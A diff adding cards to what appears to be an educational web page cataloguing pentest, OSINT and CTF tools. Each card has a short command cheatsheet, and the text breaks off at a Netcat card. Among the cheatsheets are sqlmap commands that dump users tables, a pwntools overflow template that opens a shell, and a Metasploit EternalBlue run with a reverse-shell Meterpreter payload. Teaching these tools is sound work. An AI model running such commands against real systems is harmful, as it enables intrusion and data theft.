+          <p class="card-desc">Automated SQL injection detection and exploitation tool. Supports MySQL, PostgreSQL, MSSQL, Oracle, and more. Can dump databases, bypass authentication, and even get a shell on vulnerable targets — all from a single command.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">sqlmap -u "http://target.com/?id=1" --dbs
+sqlmap -u "URL" -D dbname --tables
+sqlmap -u "URL" -D dbname -T users --dump
+sqlmap -u "URL" --forms --crawl=2
+sqlmap -u "URL" --level=5 --risk=3</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://sqlmap.org" target="_blank">sqlmap.org</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="nikto web server scanner vulnerability headers">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Nikto</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Open-source web server scanner that tests for over 6,700 potentially dangerous files and scripts. Checks for outdated server software, insecure HTTP headers, and common misconfigurations. Fast and easy to use for a quick surface-level audit.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">nikto -h http://target.com
+nikto -h target.com -p 443 -ssl
+nikto -h target.com -o report.html -Format htm
+nikto -h target.com -Tuning 1      # files only</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/sullo/nikto" target="_blank">github.com/sullo/nikto</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="gobuster ffuf directory brute force fuzzing path">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Gobuster / FFUF</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Fast directory and file brute-forcers for finding hidden paths on web servers. Gobuster is reliable for directory enumeration; FFUF (Fuzz Faster U Fool) is more flexible with powerful filtering options. Both use wordlists to discover endpoints that aren't linked anywhere.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">gobuster dir -u http://target.com -w wordlist.txt
+gobuster dns -d target.com -w subdomains.txt
+ffuf -u http://target.com/FUZZ -w list.txt
+ffuf -u http://target.com/FUZZ -w list.txt \
+  -mc 200,301 -fs 1234</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/ffuf/ffuf" target="_blank">github.com/ffuf/ffuf</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="zap owasp web application security scanner proxy">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">OWASP ZAP</div>
+            <div class="card-badges">
+              <span class="badge badge-web">GUI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">OWASP's free and open-source web security scanner. Great alternative to Burp Suite Community. Features an intercepting proxy, active/passive scanning, spider, and fuzzer. Excellent for beginners learning web security fundamentals with a full GUI.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ CLI Mode</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">zap-cli quick-scan -s xss,sqli http://target.com
+zap-cli spider http://target.com
+zap-cli active-scan http://target.com
+zap-cli report -o report.html -f html</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.zaproxy.org" target="_blank">zaproxy.org</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="exploit-db database cve poc exploits searchsploit">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Exploit-DB + Searchsploit</div>
+            <div class="card-badges">
+              <span class="badge badge-web">WEB</span>
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The world's largest public exploit database, maintained by Offensive Security. Search CVEs and PoC code directly from the browser. Searchsploit is the offline CLI version pre-installed on Kali Linux — search without internet, copy exploit templates locally.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Searchsploit Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">searchsploit apache 2.4
+searchsploit -t wordpress 5.8   # title-only
+searchsploit -m 12345           # copy exploit
+searchsploit --cve CVE-2021-41773
+searchsploit -u                 # update db</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.exploit-db.com" target="_blank">exploit-db.com</a>
+            <div class="card-badges"><span class="badge badge-free">FREE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="wappalyzer whatweb technology fingerprinting stack detection">
+        <div class="card-accent acc-green"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Wappalyzer / WhatWeb</div>
+            <div class="card-badges">
+              <span class="badge badge-web">WEB</span>
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Technology fingerprinting tools that identify what a website is built with — CMS, frameworks, server software, libraries, and more. Wappalyzer is a browser extension for real-time detection; WhatWeb is the powerful CLI equivalent for in-depth enumeration.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ WhatWeb Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">whatweb http://target.com
+whatweb -a 3 http://target.com  # aggression lvl
+whatweb -v http://target.com    # verbose output
+whatweb --log-json=out.json target.com</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.wappalyzer.com" target="_blank">wappalyzer.com</a>
+            <div class="card-badges"><span class="badge badge-free">BROWSER EXT</span></div>
+          </div>
+        </div>
+      </div>
+
     </div>
-    <div class="card-footer">
-      <span class="card-link-hint">เปิดเว็บไซต์ </span>
+  </section>
+
+  <!-- ════════ 2. AI IN CYBERSECURITY ════════ -->
+  <section class="section" data-section="ai">
+    <div class="section-header">
+      <div class="section-icon icon-purple">🤖</div>
+      <span class="section-title">AI in Cybersecurity <span class="section-count">4 tools</span></span>
+      <div class="section-line"></div>
     </div>
-  `;
-  return a;
+    <div class="tools-grid">
+
+      <div class="tool-card" data-search="pentestgpt ai gpt pentest guide assistant automated">
+        <div class="card-accent acc-purple"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">PentestGPT</div>
+            <div class="card-badges">
+              <span class="badge badge-ai">AI</span>
+              <span class="badge badge-web">WEB</span>
+            </div>
+          </div>
+          <p class="card-desc">An AI-powered penetration testing assistant built on top of GPT-4. It guides you through the entire pentest lifecycle — from reconnaissance to exploitation — by suggesting tools, analyzing outputs you paste in, and recommending next steps contextually.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Example Prompts</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">"I found port 22 open, what next?"
+"Here is my nmap output: [paste]
+ Analyze and suggest attack vectors."
+"I got a shell, how do I escalate?"
+"Generate a pentest report outline."</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/GreyDGL/PentestGPT" target="_blank">github.com/GreyDGL/PentestGPT</a>
+            <div class="card-badges"><span class="badge badge-ai">AI ASSISTED</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="kawaiigpt ctf ai assistant challenge solver hints">
+        <div class="card-accent acc-purple"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">KawaiiGPT</div>
+            <div class="card-badges">
+              <span class="badge badge-ai">AI</span>
+              <span class="badge badge-web">WEB</span>
+            </div>
+          </div>
+          <p class="card-desc">A specialized AI assistant tuned for CTF (Capture The Flag) challenges. Helps players understand cryptography puzzles, reverse engineering tasks, steganography hints, and web challenges. Explains reasoning step-by-step rather than just giving flags.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Usage Tips</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">"Here is an encoded string: [paste]
+ What cipher might this be?"
+"I have a .pcap file. What filters
+ should I apply to find the flag?"
+"Explain RSA CTF basics step by step."</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com" target="_blank">CTF AI Assistant</a>
+            <div class="card-badges"><span class="badge badge-ai">CTF FOCUSED</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="claude chatgpt ai llm security code review vulnerability analysis">
+        <div class="card-accent acc-purple"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Claude / ChatGPT for Security</div>
+            <div class="card-badges">
+              <span class="badge badge-ai">AI</span>
+              <span class="badge badge-web">WEB</span>
+            </div>
+          </div>
+          <p class="card-desc">General-purpose LLMs are powerful security research companions. Use them to explain vulnerability concepts, analyze code for security issues, draft regex patterns, decode obfuscated scripts, write exploit PoC explanations, and understand CVE write-ups faster.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Security Prompts</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">"Review this PHP code for SQLi: [code]"
+"Explain CVE-2024-XXXX in simple terms."
+"What does this Base64 decode to?"
+"Write a Python script to parse
+ this Nmap XML output."</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://claude.ai" target="_blank">claude.ai</a>
+            <div class="card-badges"><span class="badge badge-ai">FREE TIER</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="nuclei vulnerability scanner templates ai driven automated">
+        <div class="card-accent acc-purple"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Nuclei</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Community-driven vulnerability scanner using YAML templates. Thousands of templates detect CVEs, misconfigurations, exposed panels, and default credentials. ProjectDiscovery's AI system auto-generates new templates from vulnerability write-ups — a bridge between AI and scanning.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">nuclei -u https://target.com
+nuclei -u https://target.com -t cves/
+nuclei -l targets.txt -t exposures/
+nuclei -u target.com -severity critical,high
+nuclei -update-templates</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://nuclei.projectdiscovery.io" target="_blank">projectdiscovery.io</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════ 3. INFORMATION GATHERING / OSINT ════════ -->
+  <section class="section" data-section="osint">
+    <div class="section-header">
+      <div class="section-icon icon-blue">🔍</div>
+      <span class="section-title">Information Gathering / OSINT <span class="section-count">6 tools</span></span>
+      <div class="section-line"></div>
+    </div>
+    <div class="tools-grid">
+
+      <div class="tool-card" data-search="nmap network scanner port service os detection">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Nmap</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The gold standard for network reconnaissance. Discovers live hosts, open ports, running services and their versions, and operating systems. The Nmap Scripting Engine (NSE) extends it with vulnerability detection, brute-forcing, and service enumeration scripts.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Essential Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">nmap -sV -sC -O 192.168.1.1       # full scan
+nmap -p- --min-rate 5000 target    # all ports
+nmap -sU -p 53,161 target          # UDP scan
+nmap --script vuln target          # vuln scripts
+nmap -A -T4 target -oN output.txt  # aggressive</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://nmap.org" target="_blank">nmap.org</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="shodan search engine iot internet exposed devices">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Shodan</div>
+            <div class="card-badges">
+              <span class="badge badge-web">WEB</span>
+              <span class="badge badge-paid">PAID/FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The "search engine for the internet of things." Shodan continuously scans the entire internet and indexes exposed devices — servers, cameras, routers, industrial systems. Use it to discover an organization's internet-facing attack surface without sending a single packet.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Search Dorks</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">org:"Company Name"                 # by org
+port:22 country:TH                 # SSH in Thailand
+product:"Apache httpd" vuln:CVE-X  # vuln check
+hostname:target.com
+"default password" port:80</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.shodan.io" target="_blank">shodan.io</a>
+            <div class="card-badges"><span class="badge badge-paid">FREE TIER</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="theHarvester email osint subdomain intelligence gathering">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">theHarvester</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">OSINT tool for gathering email addresses, subdomains, employee names, and IP information from public sources. Aggregates data from Google, Bing, LinkedIn, Shodan, Hunter.io, and many more. Essential for the initial passive reconnaissance phase.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">theHarvester -d target.com -b google
+theHarvester -d target.com -b all
+theHarvester -d target.com -b linkedin
+theHarvester -d target.com -b shodan \
+  -l 500 -f output.html</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/laramies/theHarvester" target="_blank">github: theHarvester</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="maltego osint graph link analysis visualization relationship">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Maltego</div>
+            <div class="card-badges">
+              <span class="badge badge-web">GUI</span>
+              <span class="badge badge-paid">PAID/FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Powerful OSINT and graphical link-analysis tool. Visualizes relationships between people, companies, domains, IPs, and social media accounts as an interactive graph. Uses "transforms" to automate data collection from dozens of sources. Community edition is free.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Workflow Steps</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code"># 1. Add entity (Domain / Person / Email)
+# 2. Right-click → Run Transforms
+# 3. Select: "DNS to IP", "Email to Person"
+# 4. Expand graph iteratively
+# 5. Export graph as PDF/image</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.maltego.com" target="_blank">maltego.com</a>
+            <div class="card-badges"><span class="badge badge-free">FREE TIER</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="whois dns recon passive footprint subdomain">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Whois / DNSRecon</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Foundational passive recon tools. <code style="font-family:JetBrains Mono;font-size:11px;color:var(--green)">whois</code> retrieves domain registration details — registrant, registrar, name servers. DNSRecon performs comprehensive DNS enumeration: zone transfers, brute-forcing subdomains, and mapping all DNS records.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">whois target.com
+dnsrecon -d target.com -t std
+dnsrecon -d target.com -t axfr    # zone transfer
+dnsrecon -d target.com -D list.txt -t brt
+dig target.com ANY +noall +answer</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/darkoperator/dnsrecon" target="_blank">github: dnsrecon</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="recon-ng framework osint modules automated web intelligence">
+        <div class="card-accent acc-blue"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Recon-ng</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">A full-featured web reconnaissance framework similar to Metasploit in structure. Uses a workspace and module system to collect OSINT from APIs, DNS, search engines, and breach databases. Results are stored in a built-in database for structured reporting.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Basic Workflow</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">recon-ng
+> workspaces create target
+> marketplace search hackertarget
+> marketplace install hackertarget/...
+> modules load hackertarget/...
+> options set SOURCE target.com
+> run</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/lanmaster53/recon-ng" target="_blank">github: recon-ng</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════ 4. CTF & WARGAMES TOOLS ════════ -->
+  <section class="section" data-section="ctf">
+    <div class="section-header">
+      <div class="section-icon icon-amber">🚩</div>
+      <span class="section-title">CTF &amp; Wargames Tools <span class="section-count">6 tools</span></span>
+      <div class="section-line"></div>
+    </div>
+    <div class="tools-grid">
+
+      <div class="tool-card" data-search="cyberchef decode encode crypto analysis swiss army knife">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">CyberChef</div>
+            <div class="card-badges">
+              <span class="badge badge-web">WEB</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The Cyber Swiss Army Knife — a browser-based app for encoding, decoding, encrypting, and analyzing data. Drag-and-drop "recipes" chain 300+ operations like Base64, XOR, AES, ROT13, hex, magic detection, regex, and hashing. Essential for CTF crypto and forensics.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Common Recipes</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">From Base64 → To Text
+From Hex → To Text
+XOR Brute Force (key: 1-50)
+Magic (auto-detect encoding)
+ROT13 → From Base64 → Gunzip</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://gchq.github.io/CyberChef" target="_blank">gchq.github.io/CyberChef</a>
+            <div class="card-badges"><span class="badge badge-free">BROWSER TOOL</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="ghidra reverse engineering binary disassembler decompiler nsa">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Ghidra</div>
+            <div class="card-badges">
+              <span class="badge badge-web">GUI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">NSA's open-source reverse engineering suite. Disassembles and decompiles binaries back into readable C-like pseudocode. Supports x86, ARM, MIPS, and more. The go-to free tool for CTF reverse engineering challenges and malware analysis. Comparable to IDA Pro.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Key Shortcuts</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">G         → Go to address
+Ctrl+F    → Search strings/functions
+L         → Rename variable/function
+Ctrl+L    → Search labels
+Decompile window → Read pseudo-C
+Script Manager → Automate analysis</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://ghidra-sre.org" target="_blank">ghidra-sre.org</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="pwndbg pwntools gdb binary exploitation pwn heap">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">pwntools + pwndbg</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The essential toolkit for binary exploitation CTFs. pwntools is a Python library for writing exploit scripts — handling shellcode, ROP chains, format strings, and remote connections. pwndbg is a GDB plugin that adds heap visualization, paging, and exploit-aware commands.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ pwntools Basics</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">from pwn import *
+p = process('./binary')         # local
+p = remote('host', 1337)        # remote
+payload = b'A'*40 + p64(0xdeadbeef)
+p.sendline(payload)
+p.interactive()                 # get shell</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://docs.pwntools.com" target="_blank">docs.pwntools.com</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="steghide stegsolve steganography hidden image audio CTF">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Steghide / Stegsolve</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Steganography tools for finding hidden data in images and audio files — a staple of CTF challenges. Steghide embeds/extracts data from JPEGs and MP3s. Stegsolve is a Java GUI that applies bit-plane filters and color analyses to reveal hidden messages in images.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">steghide extract -sf image.jpg
+steghide extract -sf img.jpg -p ""  # no pass
+binwalk -e file.jpg              # extract files
+strings file.jpg | grep flag
+java -jar Stegsolve.jar          # GUI analysis</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://steghide.sourceforge.net" target="_blank">steghide.sourceforge.net</a>
+            <div class="card-badges"><span class="badge badge-free">FREE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="hashcat john the ripper hash cracking password ctf">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Hashcat / John the Ripper</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Password cracking powerhouses. Hashcat uses GPU acceleration for blazing speed — billions of hashes per second. John the Ripper (JtR) is CPU-based with excellent format auto-detection. Both support dictionary, brute-force, and rule-based attacks. Crucial for CTF crypto and forensic challenges.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Key Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">hashcat -m 0 hash.txt rockyou.txt    # MD5
+hashcat -m 1800 hash.txt rockyou.txt # sha512
+hashcat -a 3 hash.txt ?a?a?a?a?a    # brute
+john hash.txt --wordlist=rockyou.txt
+john --show hash.txt</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://hashcat.net" target="_blank">hashcat.net</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="wireshark network analysis packet pcap traffic capture forensics">
+        <div class="card-accent acc-amber"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Wireshark</div>
+            <div class="card-badges">
+              <span class="badge badge-web">GUI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The world's most popular network protocol analyzer. Captures and interactively browses live network traffic or opens .pcap files. In CTFs, pcap forensics challenges often hide flags inside DNS queries, HTTP responses, or custom protocols — Wireshark is the first tool you reach for.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Key Filters</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">http                    # HTTP only
+tcp.port == 4444        # specific port
+ip.addr == 10.0.0.1     # filter IP
+dns.qry.name contains "flag"
+frame contains "CTF{"   # find flag string
+Follow → TCP Stream     # read conversation</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.wireshark.org" target="_blank">wireshark.org</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════ 5. NETWORK & EXPLOITATION ════════ -->
+  <section class="section" data-section="network">
+    <div class="section-header">
+      <div class="section-icon icon-red">⚡</div>
+      <span class="section-title">Network &amp; Exploitation <span class="section-count">4 tools</span></span>
+      <div class="section-line"></div>
+    </div>
+    <div class="tools-grid">
+
+      <div class="tool-card" data-search="metasploit framework exploit payloads meterpreter post-exploitation">
+        <div class="card-accent acc-red"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Metasploit Framework</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The world's most widely used penetration testing framework with over 2,000 exploits. Find a vulnerability → pick a module → set options → get a Meterpreter shell. Post-exploitation features include privilege escalation, pivoting, credential dumping, and persistence.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Essential msfconsole</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">msfconsole
+> search eternalblue
+> use exploit/windows/smb/ms17_010_eternalblue
+> set RHOSTS 192.168.1.x
+> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+> set LHOST 192.168.1.y
+> run</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://www.metasploit.com" target="_blank">metasploit.com</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="netcat nc swiss army knife listener reverse shell file transfer">
+        <div class="card-accent acc-red"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Netcat (nc)</div>
+            <div class="card-badges">
